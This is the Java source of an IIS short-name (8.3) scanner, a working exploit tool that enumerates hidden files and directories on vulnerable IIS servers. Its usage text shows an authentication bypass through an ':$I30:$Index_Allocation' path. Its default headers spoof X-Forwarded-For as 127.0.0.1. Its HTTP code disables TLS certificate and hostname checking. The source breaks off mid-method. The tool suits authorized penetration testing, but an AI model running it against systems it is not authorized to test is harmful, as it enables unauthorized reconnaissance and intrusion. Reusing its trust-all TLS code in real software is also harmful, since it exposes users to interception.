import java.io.Console;
import java.net.*;
import java.util.*;

import javax.net.ssl.*;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.Enumeration;
import java.util.Properties;

public class scanner {
	/* Do not change the below lines if it's Greek to you!*/

	private static boolean debugMode;
	private static String customUserAgent;
	private static String customCookie;
	private static String additionalQuery;
	private static String scanList;
	private static int maxConnectionTimeOut;
	private static int maxRetryTimes;
	private static String proxyServerName;
	private static Integer proxyServerPort;
	private static Long maxDelayAfterEachRequest;
	private static String questionMarkSymbol;
	private static String asteriskSymbol;
	private static String magicFileName;
	private static String magicFileExtension;
	private static String[] magicFinalPartList;
	private static String[] additionalHeaders;
	private static String[] requestMethod;
	private static int acceptableDifferenceLengthBetweenResponses;
	private static boolean onlyCheckForVulnerableSite = false;
	private final static String configFile = "config.xml";
	private final static String strVersion = "2.1.0 - 09August2014";
	public Set<String> finalResultsFiles = new TreeSet<String>();
	public Set<String> finalResultsDirs = new TreeSet<String>();
	private static String[] arrayScanList;
	private String[] arrayScanListExt;
	private String[] arrayScanListName;
	private Set<String> scanListName = new TreeSet<String>();
	private Set<String> scanListExtension = new TreeSet<String>();
	private final static String[] marker = {"[-]", "[\\]", "[|]", "[/]"}; // To show the progress
	private static String destURL;
	private static int showProgress;
	private static int concurrentThreads;
	private String magicFinalPart;
	private String reliableRequestMethod;
	private String validStatus = "";
	private String invalidStatus = "";
	private boolean boolIsQuestionMarkReliable = false;
	private boolean boolIsExtensionReliable = false;
	private int threadCounter = 0;
	private ThreadPool threadPool = new ThreadPool(0);
	private long reqCounter = 0;
	private Proxy proxy;

	public static void main(String[] args) throws Exception {
		// Get URL from input!
		scanner obj = new scanner();

		try {
			if (args.length == 3 || args.length == 1) {
				String url = "";
				if(args.length==1){
					// Only check for a vulnerable target
					onlyCheckForVulnerableSite = true;
					url = args[0];
					showProgress = 2;
					concurrentThreads = 0;
				}else{
					// Full Scan Mode
					if (args[0].equals("0")) {
						showProgress = 0; // Just show the final results
					} else if (args[0].equals("1")) {
						showProgress = 1; // Just show the findings one by one
					} else {
						showProgress = 2; // Show progress
					}
					concurrentThreads = Integer.parseInt(args[1]);
					if (concurrentThreads < 0) {
						concurrentThreads = 0;
					}
	
					if (concurrentThreads > 0 && showProgress == 2) {
						//showProgress = 1; // Show progress may not work beautifully in Multithread mode but I like it!
					}
	
					url = args[2];
				}
				// Basic check for the URL
				if(url.length()<8) throw new Exception(); // URL is too short
				if(url.indexOf("?")>0)
					url = url.substring(0, url.indexOf("?"));
				if(url.indexOf(";")>0)
					url = url.substring(0, url.indexOf(";"));
				if(!url.endsWith("/") && url.lastIndexOf("/")<8)
					url += "/";
				url = url.substring(0, url.lastIndexOf("/")+1);
				if(url.length()<8) throw new Exception(); // URL is too short
				System.out.println("Target = " + url);
				
				// Load the config file
				System.out.println("-- Current Configuration -- Begin");
				loadConfig();
				System.out.println("-- Current Configuration -- End");
				
				arrayScanList = scanList.split("");
				
				Console console = System.console();
				
				// Delay after each request
				String delayMilliseconds = "0";
				if(console!=null){
					delayMilliseconds = console.readLine("How much delay do you want after each request in milliseconds [default=0]?");
					if(!delayMilliseconds.equals("") && obj.isLong(delayMilliseconds)){
						maxDelayAfterEachRequest = Long.parseLong(delayMilliseconds);
						if(maxDelayAfterEachRequest<0){
							maxDelayAfterEachRequest = (long) 0;
						}
					}
				}
				System.out.println("Max delay after each request in milliseconds = " + String.valueOf(maxDelayAfterEachRequest));
				
				// Proxy server setting
				String hasProxy = "No";
				if(console!=null){
					hasProxy = console.readLine("Do you want to use proxy [Y=Yes, Anything Else=No]?");
					if(hasProxy.toLowerCase().equals("y")||hasProxy.toLowerCase().equals("yes")){
						String _proxyServerName = console.readLine("Proxy server Name?");

						String _proxyServerPort = "0";
						if(!_proxyServerName.equals("")){
							_proxyServerPort = console.readLine("Proxy server port?");
							if(!_proxyServerPort.equals("") && obj.isInteger(_proxyServerPort)){
								// We can set the proxy server now
								proxyServerName = _proxyServerName;
								proxyServerPort = Integer.parseInt(_proxyServerPort);
								if(proxyServerPort<=0 || proxyServerPort>65535){
									proxyServerName = "";
									proxyServerPort = 0;
								}
							}
						}
					}
				}
				
				if(!proxyServerName.equals(""))
					System.out.println("\rProxy Server:"+proxyServerName+":"+String.valueOf(proxyServerPort)+"\r\n");
				else
					System.out.println("\rNo proxy has been used.\r\n");
								
				// Beginning...
				Date start_date = new Date();
				System.out.println("\rScanning...\r\n");
				// Start scanning ...
				obj.doScan(url);
				Date end_date = new Date();
				long l1 = start_date.getTime();
				long l2 = end_date.getTime();
				long difference = l2 - l1;
				
				
				// ...Finished
				System.out.println("\r\n\rFinished in: " + difference / 1000 + " second(s)");
				
			} else {
				showUsage();
			}

		} catch (Exception err) {
			showUsage();
		}
	}
	
	private static void loadConfig() throws Exception{
		try {
			File file = new File(configFile);
			FileInputStream fileInput = new FileInputStream(file);
			Properties properties = new Properties();
			
			properties.loadFromXML(fileInput);
			fileInput.close();

			Enumeration enuKeys = properties.keys();			
			String additionalHeadersDelimiter = "";
			String additionalHeadersString = "";
			String magicFinalPartDelimiter = "";
			String magicFinalpartStringList = "";
			String requestMethodDelimiter = "";
			String requestMethodString = "";
			
			while (enuKeys.hasMoreElements()) {
				String key = (String) enuKeys.nextElement();
				String value = properties.getProperty(key);
		
				switch(key.toLowerCase()){
					case "debug":
						try{
							debugMode = Boolean.parseBoolean(properties.getProperty(key));
						}catch(Exception e){
							debugMode = false;
						}
						break;
					case "useragent":
						customUserAgent = properties.getProperty(key,"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10");
						break;
					case "cookies":
						customCookie = properties.getProperty(key,"IIS_Short_File_Scanner=1");
						break;
					case "headersdelimiter":
						additionalHeadersDelimiter = properties.getProperty(key,"@@");
						break;
					case "headers":
						additionalHeadersString = properties.getProperty(key,"X-Forwarded-For: 127.0.0.1@@X-Originating-IP: 127.0.0.1@@X-Cluster-Client-Ip: 127.0.0.1");
						break;
					case "urlsuffix":
						additionalQuery = properties.getProperty(key,"?&aspxerrorpath=/");
						break;
					case "inscopecharacters":
						scanList = properties.getProperty(key,"0123456789abcdefghijklmnopqrstuvwxyz!#$%&'()-@^_`{}~");
						break;
					case "maxconnectiontimeout":
						try{
							maxConnectionTimeOut = Integer.parseInt(properties.getProperty(key,"20000"));
						}catch(Exception e){
							maxConnectionTimeOut = 20000;
						}
						break;
					case "maxretrytimes":
						try{
							maxRetryTimes = Integer.parseInt(properties.getProperty(key,"10"));
						}catch(Exception e){
							maxRetryTimes = 10;
						}
						break;
					case "proxyservername":
						proxyServerName = properties.getProperty(key,"");
						break;
					case "proxyserverport":
						try{
							proxyServerPort = Integer.parseInt(properties.getProperty(key,"0"));
						}catch(Exception e){
							proxyServerPort = 0;
						}
						break;
					case "maxdelayaftereachrequest":			
						try{
							maxDelayAfterEachRequest = Long.parseLong(properties.getProperty(key,"0"));
						}catch(Exception e){
							maxDelayAfterEachRequest = (long) 0;
						}
						break;
					case "magicfinalpartdelimiter":
						magicFinalPartDelimiter = properties.getProperty(key,",");
						break;
					case "magicfinalpartlist":
						magicFinalpartStringList = properties.getProperty(key,"\\a.asp,/a.asp,\\a.aspx,/a.aspx,/a.shtml,/a.asmx,/a.ashx,/a.config,/a.php,/a.jpg,,/a.xxx");
						break;
					case "questionmarksymbol":
						questionMarkSymbol = properties.getProperty(key,"?");
						break;
					case "asterisksymbol":
						asteriskSymbol = properties.getProperty(key,"*");
						break;
					case "magicfilename":
						magicFileName = properties.getProperty(key,"*~1*");
						break;
					case "magicfileextension":
						magicFileExtension = properties.getProperty(key,"*");
						break;
					case "requestmethoddelimiter":
						requestMethodDelimiter = properties.getProperty(key,",");
						break;
					case "requestmethod":
						requestMethodString = properties.getProperty(key,"OPTIONS,GET,POST,HEAD,TRACE,TRACK");
						break;						
					case "acceptabledifferencelengthbetweenresponses":
						try{
							acceptableDifferenceLengthBetweenResponses = Integer.parseInt(properties.getProperty(key,"10"));
						}catch(Exception e){
							acceptableDifferenceLengthBetweenResponses = -1;
						}
						break;
					default:
						System.out.println("Unknown item in config file: " + key);
				}
				if(value=="") value = "Default";
				System.out.println(key + ": " + value);
			}
			
			additionalHeaders = additionalHeadersString.split(additionalHeadersDelimiter);
			magicFinalPartList = magicFinalpartStringList.split(magicFinalPartDelimiter);
			requestMethod = requestMethodString.split(requestMethodDelimiter);
			
		} catch (FileNotFoundException e) {
			System.out.println("Config file was not found: " + configFile);
			throw new Exception();
		} catch (IOException e) {
			System.out.println("Error in loading config file: " + configFile);
			throw new Exception();
		}	
	}
	
	private static void showUsage() {
		char[] delim = new char[75];
		Arrays.fill(delim, '*');
		System.out.println("");
		System.out.println(String.valueOf(delim));
		System.out.println("\r\n* IIS Short File/Folder Name (8.3) Scanner \r\n* by Soroush Dalili - @irsdl");
		System.out.println("* Version: " + strVersion);
		System.out.println("* WARNING: You are only allowed to run the scanner against the websites which you have given permission to scan. We do not accept any responsibility for any damage/harm that this application causes to your computer or your network as it is only a proof of concept and may lead to unknown issues. It is your responsibility to use this code legally and you are not allowed to sell this code in any way. The programmer is not responsible for any illegal or malicious use of this code. Be Ethical! \r\n");
		System.out.println(String.valueOf(delim));
		System.out.println("\r\nUSAGE 1 (To verify if the target is vulnerable):\r\n java scanner [URL]\r\n");
		System.out.println("\r\nUSAGE 2 (To find 8.3 file names):\r\n java scanner [ShowProgress] [ThreadNumbers] [URL]\r\n");
		System.out.println("DETAILS:");
		System.out.println(" [ShowProgress]: 0= Show final results only - 1= Show final results step by step  - 2= Show Progress");
		System.out.println(" [ThreadNumbers]: 0= No thread - Integer Number = Number of concurrent threads [be careful about IIS Denial of Service]");
		System.out.println(" [URL]: A complete URL - starts with http/https protocol\r\n\r\n");
		System.out.println("- Example 0 (to see if the target is vulnerable):\r\n java scanner http://example.com/folder/\r\n");
		System.out.println("- Example 1 (uses no thread - very slow):\r\n java scanner 2 0 http://example.com/folder/new%20folder/\r\n");
		System.out.println("- Example 2 (uses 20 threads - recommended):\r\n java scanner 2 20 http://example.com/folder/new%20folder/\r\n");
		System.out.println("- Example 3 (saves output in a text file):\r\n java scanner 0 20 http://example.com/folder/new%20folder/ > c:\\results.txt\r\n");
		System.out.println("- Example 4 (bypasses IIS basic authentication):\r\n java scanner 2 20 http://example.com/folder/AuthNeeded:$I30:$Index_Allocation/\r\n");
		System.out.println("Note 1: Edit config.xml file to change the scanner settings and add additional headers.");
		System.out.println("Note 2: Sometimes it does not work for the first time and you need to try again.");
	}

	private void doScan(String url) throws Exception {
		destURL = url;
		magicFileName = magicFileName.replace("*", asteriskSymbol);
		magicFileExtension = magicFileExtension.replace("*", asteriskSymbol);
		
		boolean isReliableResult = false;
		// Create the proxy string
		if(!proxyServerName.equals("") && !proxyServerPort.equals("")){
			proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxyServerName, proxyServerPort));
		}
		
		for(String s1:magicFinalPartList){
			for(String s2:requestMethod){
				magicFinalPart = s1;
				reliableRequestMethod = s2;
				System.out.println("Testing request method: \"" + s2 + "\" with magic part: \""+ s1 + "\" ...");
				isReliableResult = isReliable();
				if (isReliableResult) {
					System.out.println("Reliable request method was found = " + s2);
					System.out.println("Reliable magic part was found = " + s1);
					if(onlyCheckForVulnerableSite){
						System.out.println(getReqCounter() + " requests have been sent to the server:");
						System.out.println("\r\n<<< The target website is vulnerable! >>>");
						return;
					}else{
						boolIsQuestionMarkReliable = isQuestionMarkReliable();
						if (concurrentThreads == 0) {
							iterateScanFileName("");
						} else {
							scanListPurifier();
							threadPool = new ThreadPool(concurrentThreads);
							incThreadCounter(1);
							threadPool.runTask(multithread_iterateScanFileName(""));
						}
					}
					break;
				}
			}
			if (isReliableResult) break;
		}
		
		if(!isReliableResult)
			System.err.println("Cannot get proper/different error messages from the server. Check the inputs and try again.");
		
		while (threadCounter != 0) {
			Thread.sleep(1);
		}
		threadPool.join();
		System.out.println("\r\n\r\n--------- Final Result ---------");
		System.out.println(getReqCounter() + " requests have been sent to the server:");
		if (!finalResultsDirs.isEmpty() || !finalResultsFiles.isEmpty()) {
			String additionalData = "";
			for (String s : finalResultsDirs) {
				additionalData = "";
				if  (s.indexOf("~") < 6){
					if  (s.indexOf("~") == 5 && s.matches(".*(\\w\\d|\\d\\w).*")){
						additionalData = " -- Possible directory name = " + s.substring(0,s.indexOf("~"));
					}else{
						additionalData = " -- Actual directory name = " + s.substring(0,s.indexOf("~"));
					}
				}
				if  (s.length() - s.lastIndexOf(".") <= 3)
					additionalData += " -- Actual extension = " + s.substring(s.lastIndexOf("."));
		
				System.out.println("Dir: " + s + additionalData);
				
			}

			for (String s : finalResultsFiles) {
				additionalData = "";
				if  (s.indexOf("~") < 6){	
					if  (s.indexOf("~") == 5 && s.matches(".*(\\w\\d|\\d\\w).*")){
						additionalData = " -- Possible file name = " + s.substring(0,s.indexOf("~"));
					}else{
						additionalData = " -- Actual file name = " + s.substring(0,s.indexOf("~"));
					}
				}
				if  (s.length() - s.lastIndexOf(".") <= 3)
					additionalData += " -- Actual extension = " + s.substring(s.lastIndexOf("."));
				System.out.println("File: " + s + additionalData);
			}
		}
		
		System.out.println();
		System.out.println(finalResultsDirs.size() + " Dir(s) was/were found");
		System.out.println(finalResultsFiles.size() + " File(s) was/were found\r\n");
		
		// Show message for boolIsQuestionMarkReliable
		if(!boolIsQuestionMarkReliable){
			System.out.println("Question mark character was blocked: you may have a lot of false positives. -> manual check is needed.");
		}
		// Show message for boolIsExtensionReliable
		if(!boolIsExtensionReliable){
			System.out.println("File extensions could not be verified. you may have false positive results. -> manual check is needed.");
		}

	}

	private void scanListPurifier() {
		try {
			ThreadPool localThreadPool = new ThreadPool(concurrentThreads);
			for (int i = 1; i < arrayScanList.length; i++) {
				localThreadPool.runTask(multithread_NameCharPurifier(arrayScanList[i]));
				if(boolIsExtensionReliable)
					localThreadPool.runTask(multithread_ExtensionCharPurifier(arrayScanList[i]));
			}
			localThreadPool.join();
			arrayScanListName=(String[])scanListName.toArray(new String[0]);
			if(boolIsExtensionReliable)
				arrayScanListExt=(String[])scanListExtension.toArray(new String[0]);
		} catch (Exception e) {
			if (debugMode) {
				e.printStackTrace();
			}
		}
	}

	private Runnable multithread_NameCharPurifier(final String strInput) throws Exception {
		return new Runnable() {

			public void run() {
				try {
					String statusCode = GetStatus("/*" + strInput + asteriskSymbol + "~1*" + magicFinalPart); // Should be valid to be added to the list
					if (statusCode.equals("404")) {
						statusCode = GetStatus("/1234567890" + strInput + asteriskSymbol + "~1" + asteriskSymbol + magicFinalPart); // It is obviously invalid, but some URL rewriters are sensitive against some characters! 
						if (!statusCode.equals("404")) {
							addValidCharToName(strInput); // Valid character - add it to the list
							if (debugMode) {
								System.out.println("Valid character in name:" + strInput);
							}
						}
					}
				} catch (Exception e) {
					if (debugMode) {
						e.printStackTrace();
					}
				}
				decThreadCounter(1);
			}
		};
	}

	private synchronized void addValidCharToName(String strInput) {
		scanListName.add(strInput);
	}

	private Runnable multithread_ExtensionCharPurifier(final String strInput) throws Exception {
		return new Runnable() {

			public void run() {
				try {
					String statusCode = GetStatus("/" + asteriskSymbol + "~1." + asteriskSymbol + strInput + asteriskSymbol + magicFinalPart); // Should be valid to be added to the list
					if (statusCode.equals("404")) {
						statusCode = GetStatus("/" + asteriskSymbol + "~1." + asteriskSymbol + strInput + "1234567890" + magicFinalPart); // It is obviously invalid, but some URL rewriters are sensitive against some characters!
						if (!statusCode.equals("404")) {
							addValidCharToExtension(strInput); // Valid character - add it to the list
							if (debugMode) {
								System.out.println("Valid character in extension:" + strInput);
							}
						}
					}
				} catch (Exception e) {
					if (debugMode) {
						e.printStackTrace();
					}
				}
				decThreadCounter(1);
			}
		};
	}

	private synchronized void addValidCharToExtension(String strInput) {
		scanListExtension.add(strInput);
	}

	private Runnable multithread_iterateScanFileName(final String strInput) throws Exception {
		return new Runnable() {

			public void run() {
				try {
					for (int i = 0; i < arrayScanListName.length; i++) {
						String newStr = strInput + arrayScanListName[i];
						//System.out.println(newStr);
						String statusCode = GetStatus("/" + newStr + magicFileName + magicFinalPart);
						String internalMessage = "\r" + marker[i % marker.length] + " " + strInput + arrayScanListName[i].toUpperCase() + "\t\t";
						if (showProgress == 2) {
							System.out.print(internalMessage); // To show the progress! - Just Pretty!
						}
						if (statusCode.equals("404")) {
							//if(showProgress) System.out.print(internalMessage); // Print new characters to show the success! - Just Pretty!
							int isItLastFileName = isItLastFileName(newStr);
							if (isItLastFileName > 0) {
								// Add it to final list
								int counter = 1;
								while (statusCode.equals("404")) {
									String fileName = newStr + "~" + counter;
									// Find Extension
									if (isItFolder(fileName) == 1) {
										if (showProgress > 0) {
											System.out.println("\rDir: " + fileName.toUpperCase() + "\t\t");
										}
										addValidDirToResults(fileName.toUpperCase());
									}
									if(boolIsExtensionReliable){
										fileName += ".";
										incThreadCounter(1);
										threadPool.runTask(multithread_iterateScanFileExtension(fileName, ""));
										statusCode = GetStatus("/" + newStr + magicFileName.replace("1", Integer.toString(++counter)) + magicFinalPart);
									}else{
										if (showProgress > 0)
											System.out.println("\rFile: " + fileName.toUpperCase() + ".??? - extension cannot be found\t\t");
										addValidFileToResults(fileName.toUpperCase()+".???");
										statusCode = "000 Extension is not reliable";
									}
								}
								if (isItLastFileName == 2) {
									incThreadCounter(1);
									threadPool.runTask(multithread_iterateScanFileName(newStr));
								}
							} else {
								incThreadCounter(1);
								threadPool.runTask(multithread_iterateScanFileName(newStr));
							}
						} else {
							// Ignore it
						}
					}
					if (showProgress == 2) {
						System.out.print("\r\t\t\t\t");
					}

				} catch (Exception e) {
					if (debugMode) {
						e.printStackTrace();
					}
				}
				decThreadCounter(1);
			}
		};
	}

	private void iterateScanFileName(String strInput) throws Exception {
		for (int i = 1; i < arrayScanList.length; i++) {
			String newStr = strInput + arrayScanList[i];
			//System.out.println(newStr);
			String statusCode = GetStatus("/" + newStr + magicFileName + magicFinalPart);
			String internalMessage = "\r" + marker[i % marker.length] + " " + strInput + arrayScanList[i].toUpperCase() + "\t\t";
			if (showProgress == 2) {
				System.out.print(internalMessage); // To show the progress! - Just Pretty!
			}
			if (statusCode.equals("404")) {
				//if(showProgress) System.out.print(internalMessage); // Print new characters to show the success! - Just Pretty!
				int isItLastFileName = isItLastFileName(newStr);
				if (isItLastFileName > 0) {
					// Add it to final list
					int counter = 1;
					while (statusCode.equals("404")) {
						String fileName = newStr + "~" + counter;
						// Find Extension
						if (isItFolder(fileName) == 1) {
							if (showProgress > 0) {
								System.out.println("\rDir: " + fileName.toUpperCase() + "\t\t");
							}
							addValidDirToResults(fileName.toUpperCase());
						}
						if(boolIsExtensionReliable){
							fileName += ".";
							iterateScanFileExtension(fileName, "");
							
							statusCode = GetStatus("/" + newStr + magicFileName.replace("1", Integer.toString(++counter)) + magicFinalPart);
						}else{
							if (showProgress > 0)
								System.out.println("\rFile: " + fileName.toUpperCase() + ".??? - extension cannot be found\t\t");
							addValidFileToResults(fileName.toUpperCase()+".???");
							statusCode = "000 Extension is not reliable";
						}
					}
					if (isItLastFileName == 2) {
						iterateScanFileName(newStr);
					}
				} else {
					iterateScanFileName(newStr);
				}
			} else {
				// Ignore it
			}
		}
		if (showProgress == 2) {
			System.out.print("\r\t\t\t\t");
		}
	}

	private int isItLastFileName(String strInput) {
		int result = 1; // File is available and there is no more file
		if(!boolIsQuestionMarkReliable){
			// we cannot use "?" for this validation...
			// this result will include false positives...
			result = 2;
		}else{
			if (strInput.length() < 6) {
				try {
					String statusCode = GetStatus("/" + strInput + questionMarkSymbol + asteriskSymbol + "~1" + asteriskSymbol + magicFinalPart);
					if (statusCode.equals("404")) {
						result = 0; // This file is not completed
						statusCode = GetStatus("/" + strInput + "~1" + asteriskSymbol + magicFinalPart);
						if (statusCode.equals("404")) {
							result = 2; // This file is available but there is more as well
						}
					}
				} catch (Exception err) {
					if (debugMode) {
						err.printStackTrace();
					}
				}
			}
		}
		return result;
	}

	private Runnable multithread_iterateScanFileExtension(final String strFilename, final String strInput) throws Exception {
		return new Runnable() {

			public void run() {
				try {
					for (int i = 0; i < arrayScanListExt.length; i++) {
						String newStr = "";
						newStr = strInput + arrayScanListExt[i];
						String statusCode = GetStatus("/" + strFilename + newStr + magicFileExtension + magicFinalPart);
						String internalMessage = "\r" + marker[i % marker.length] + " " + strFilename + strInput + arrayScanListExt[i].toUpperCase() + "\t\t";
						if (showProgress == 2) {
							System.out.print(internalMessage); // To show the progress! - Just Pretty!
						}
						if (statusCode.equals("404")) {
							//if(showProgress) System.out.print(internalMessage); // Print new characters to show the success! - Just Pretty!
							if (isItLastFileExtension(strFilename + newStr)) {
								// Add it to final list
								String fileName = strFilename + newStr;
								if (showProgress > 0) {
									System.out.println("\rFile: " + fileName.toUpperCase() + "\t\t");
								}
								addValidFileToResults(fileName.toUpperCase());
								if (newStr.length() < 3) {
									incThreadCounter(1);
									threadPool.runTask(multithread_iterateScanFileExtension(strFilename, newStr));
								}
							} else {
								incThreadCounter(1);
								threadPool.runTask(multithread_iterateScanFileExtension(strFilename, newStr));
							}
						} else {
							// Ignore it
						}
					}
					if (showProgress == 2) {
						System.out.print("\r\t\t\t\t");
					}
				} catch (Exception e) {
					if (debugMode) {
						e.printStackTrace();
					}
				}
				decThreadCounter(1);
			}
		};
	}

	private void iterateScanFileExtension(String strFilename, String strInput) throws Exception {
		for (int i = 1; i < arrayScanList.length; i++) {
			String newStr = "";
			newStr = strInput + arrayScanList[i];
			String statusCode = GetStatus("/" + strFilename + newStr + magicFileExtension + magicFinalPart);
			String internalMessage = "\r" + marker[i % marker.length] + " " + strFilename + strInput + arrayScanList[i].toUpperCase() + "\t\t";
			if (showProgress == 2) {
				System.out.print(internalMessage); // To show the progress! - Just Pretty!
			}
			if (statusCode.equals("404")) {
				//if(showProgress) System.out.print(internalMessage); // Print new characters to show the success! - Just Pretty!
				if (isItLastFileExtension(strFilename + newStr)) {
					// Add it to final list
					String fileName = strFilename + newStr;
					if (showProgress > 0) {
						System.out.println("\rFile: " + fileName.toUpperCase() + "\t\t");
					}
					addValidFileToResults(fileName.toUpperCase());
					if (newStr.length() < 3) {
						iterateScanFileExtension(strFilename, newStr);
					}
				} else {
					iterateScanFileExtension(strFilename, newStr);
				}
			} else {
				// Ignore it
			}
		}
		if (showProgress == 2) {
			System.out.print("\r\t\t\t\t");
		}
	}

	private boolean isItLastFileExtension(String strInput) {
		boolean result = false;
		if (!boolIsExtensionReliable){
			result = true;
		}else if (strInput.length() <= 12) {
			//System.out.println(strInput);
			int extLength = 3; // default length
			if (strInput.indexOf(".") > 0 && strInput.indexOf(".") != strInput.length() - 1) {
				String[] temp = strInput.split("\\.");
				if (temp[1].length() >= extLength) {
					result = true;
				} else if (GetStatus("/" + strInput + "." + asteriskSymbol + magicFinalPart).equals("404")) {
					result = true;
				} else if (!HTTPReqResponse(strInput + magicFinalPart, 0).equals(HTTPReqResponse(strInput + "xxx" + magicFinalPart, 0))) {
					result = true;
				}
			}
			if (!result) {
				try {
					String statusCode = GetStatus("/" + strInput + magicFileExtension + magicFinalPart);
					if (!statusCode.equals("404")) {
						result = true;
					}
				} catch (Exception err) {
					if (debugMode) {
						err.printStackTrace();
					}
					//System.out.println("isItLastFileExtension() Error: " + err.toString());
				}
			}
		}
		//System.out.println(result);
		return result;
	}

	private int isItFolder(String strInput) {
		int result = 0; // No Dir or File
		if (!boolIsQuestionMarkReliable){
			// we cannot use "?" for validation!
			// too many false positives here ...
			result =1;
		}else{
			try {
				String statusCode = GetStatus("/" + strInput + questionMarkSymbol + magicFinalPart);
				if (statusCode.equals("404")) {
					result = 1; // A directory
				}
			} catch (Exception err) {
				if (debugMode) {
					err.printStackTrace();
				}
				//System.out.println("isItFolder() Error: " + err.toString());
			}
		}
		return result;
	}

	private String GetStatus(String strAddition) {
		String status = "";
		try {
			if (!strAddition.startsWith("/")) {
				strAddition = "/" + strAddition;
			}

			strAddition = strAddition.replace("//", "/");

			status = HTTPReqResponse(strAddition, 0);
			//status = HTTPReqResponseSocket(strAddition, 0);

			if (status.equals(validStatus)) {
				status = "404";
			} else {
				status = "400";
			}

		} catch (Exception err) {
			if (debugMode) {
				err.printStackTrace();
			}
			//System.out.println("GetStatus() Error: " + err.toString() + " - Status: " + status);
		}
		return status;
	}


	private boolean isReliable() {
		boolean result = false;
		try {
			validStatus = HTTPReqResponse("/" + asteriskSymbol + "~1" + asteriskSymbol + magicFinalPart, 0);
			int validStatusLength = validStatus.length();
			invalidStatus = HTTPReqResponse("/1234567890" + asteriskSymbol + "~1" + asteriskSymbol + magicFinalPart, 0);
			int invalidStatusLength = invalidStatus.length();
			
			if (!validStatus.equals(invalidStatus) && !(acceptableDifferenceLengthBetweenResponses>=0 &&
					Math.abs(invalidStatusLength - validStatusLength)<=acceptableDifferenceLengthBetweenResponses)) {
				// We need to find the first character that is different in the comparison
				
				
				String tempInvalidStatus1 = HTTPReqResponse("/0123456789" + asteriskSymbol + "~1" + asteriskSymbol + magicFinalPart, 0);
				int tempInvalidStatus1Length = tempInvalidStatus1.length();
				
				String tempInvalidStatus2 = HTTPReqResponse("/0123456789" + asteriskSymbol + "~1.1234" + asteriskSymbol + magicFinalPart, 0);
				int tempInvalidStatus2Length = tempInvalidStatus2.length();
				
				// If two different invalid requests lead to different responses, we cannot rely on them unless their length difference is negligible!
				if (tempInvalidStatus1.equals(invalidStatus) || 
						(acceptableDifferenceLengthBetweenResponses>=0 &&
						Math.abs(invalidStatusLength - tempInvalidStatus1Length)<=acceptableDifferenceLengthBetweenResponses)) 
				{
					
					if (tempInvalidStatus2.equals(invalidStatus) || 
							(acceptableDifferenceLengthBetweenResponses>=0 && 
									Math.abs(tempInvalidStatus2Length - tempInvalidStatus1Length)<=acceptableDifferenceLengthBetweenResponses)){
						boolIsExtensionReliable = true;
					}else{
						boolIsExtensionReliable = false;
						if (debugMode) {
							System.out.println("IsExtensionReliable = " + boolIsExtensionReliable);
						}
					}
					result = true;
				}
			}
		} catch (Exception err) {
			if (debugMode) {
				err.printStackTrace();
			}
			//System.out.println("isReliable Error: " + err.toString());
			result = false;
		}
		if (debugMode) {
			System.out.println("isReliable = " + result);
		}
		return result;
	}

	private boolean isQuestionMarkReliable() {
		boolean result = false;
		try {
			String initValidStatus = "";
			if (!validStatus.equals(""))
				initValidStatus = validStatus;
			else
				initValidStatus = HTTPReqResponse("/" + asteriskSymbol + "~1" + asteriskSymbol + magicFinalPart, 0);
			
			String tempValidStatus = HTTPReqResponse("/?" + asteriskSymbol + "~1" + asteriskSymbol + magicFinalPart, 0);
			if (initValidStatus.equals(tempValidStatus)) {
					result = true;
			}
		} catch (Exception err) {
			if (debugMode) {
				err.printStackTrace();
			}
			//System.out.println("isQuestionMarkReliable Error: " + err.toString());
			result = false;
		}
		if(result==false){
			try {
				String initValidStatus = "";
				if (!validStatus.equals(""))
					initValidStatus = validStatus;
				else
					initValidStatus = HTTPReqResponse("/" + asteriskSymbol + "~1" + asteriskSymbol + magicFinalPart, 0);
				
				String tempValidStatus = HTTPReqResponse("/>" + asteriskSymbol + "~1" + asteriskSymbol + magicFinalPart, 0);
				if (initValidStatus.equals(tempValidStatus)) {
						result = true;
						questionMarkSymbol = ">";
				}
			} catch (Exception err) {
				if (debugMode) {
					err.printStackTrace();
				}
				//System.out.println("isQuestionMarkReliable Error: " + err.toString());
				result = false;
			}
		}
		if (debugMode) {
			System.out.println("isQuestionMarkReliable = " + result);
		}
		return result;
	}

	// http://nadeausoftware.com/node/73
	private String HTTPReqResponse(String strAddition, int retryTimes) {
		String finalResponse = "";
		String charset = null;
		Object content = null;
		HttpURLConnection conn = null;
		incReqCounter(1);
		try {
			// Create a trust manager that does not validate certificate chains
			TrustManager[] trustAllCerts = new TrustManager[]{
					new X509TrustManager() {

						public java.security.cert.X509Certificate[] getAcceptedIssuers() {
							return null;
						}

						public void checkClientTrusted(
								java.security.cert.X509Certificate[] certs, String authType) {
						}

						public void checkServerTrusted(
								java.security.cert.X509Certificate[] certs, String authType) {
						}
					}
			};

			// Install the all-trusting trust manager
			try {
				SSLContext sc = SSLContext.getInstance("SSL");
				sc.init(null, trustAllCerts, new java.security.SecureRandom());
				HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
			} catch (Exception e) {
			}

			HttpsURLConnection.setDefaultHostnameVerifier(new HostnameVerifier() {

				public boolean verify(String string, SSLSession ssls) {
					return true;
				}
			});
			String urlEncodedStrAddition = URLEncoder.encode(strAddition, "UTF-8");
			urlEncodedStrAddition = urlEncodedStrAddition.replace("*","%2A"); // Java does not encode asterisk character
			URL finalURL = new URL(destURL + urlEncodedStrAddition + additionalQuery);

			if(!proxyServerName.equals("") && !proxyServerPort.equals("")){
				// Use the proxy server to sends the requests
				conn = (HttpURLConnection) finalURL.openConnection(proxy);
			}else{
				conn = (HttpURLConnection) finalURL.openConnection();
			}

			conn.setConnectTimeout(maxConnectionTimeOut);    // 10 sec
			conn.setReadTimeout(maxConnectionTimeOut);       // 10 sec
			conn.setInstanceFollowRedirects(false);
			if (!customUserAgent.equals("")) {
				conn.setRequestProperty("User-agent", customUserAgent);
			}
			if (!customCookie.equals("")) {
				conn.setRequestProperty("Cookie", customCookie);
			}
			
			for(String newHeader:additionalHeaders){
				conn.setRequestProperty(newHeader.split(":")[0], newHeader.split(":")[1]);
			}
			
			// Set the request method!
			conn.setRequestMethod(reliableRequestMethod);
			
			int length = 0;
			String responseHeaderStatus = "";

			try {
				// Send the request.
				conn.connect();
				Thread.sleep(maxDelayAfterEachRequest); // Delay after each request
				
				// Get the response.
